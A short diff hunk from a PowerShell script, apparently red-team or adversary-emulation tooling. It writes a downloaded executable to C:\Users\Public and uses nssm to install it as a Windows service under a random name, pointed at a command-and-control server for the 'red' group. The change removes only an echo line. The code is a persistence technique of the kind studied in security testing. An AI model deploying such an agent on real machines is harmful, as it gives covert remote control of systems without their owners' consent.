@@ -109,7 +109,6 @@
               [io.file]::WriteAllBytes("C:\Users\Public\$agfilename.exe",$data) | Out-Null;
               $env:path = $env:path + ";C:\Windows\System32\nssm-2.24-101-g897c7ad\win64\";
               $wsname=[System.IO.Path]::GetRandomFileName();
-              echo $wsname;
               nssm install $wsname C:\Users\Public\$agfilename.exe;
               nssm set $wsname AppParameters "-server $server" "-group red";
               Start-Sleep -s 5;
